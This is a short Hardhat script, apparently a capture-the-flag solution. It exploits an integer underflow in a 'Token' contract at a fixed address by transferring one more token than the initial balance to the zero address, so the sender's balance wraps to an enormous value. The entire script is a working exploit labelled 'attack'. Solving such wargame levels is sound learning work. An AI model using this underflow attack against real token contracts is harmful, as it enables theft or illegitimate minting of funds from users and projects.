// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
import { constants } from "ethers";
import { ethers } from "hardhat";

async function main() {
  // get token contract
  const token = await ethers.getContractAt("Token", "0x14876d7909eA522242e8eb711ec310674B09b981")

  // attack
  const INTIAL_TOKEN = 20
  const attackTx = await token.transfer(constants.AddressZero, INTIAL_TOKEN + 1)
  attackTx.wait(4)
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
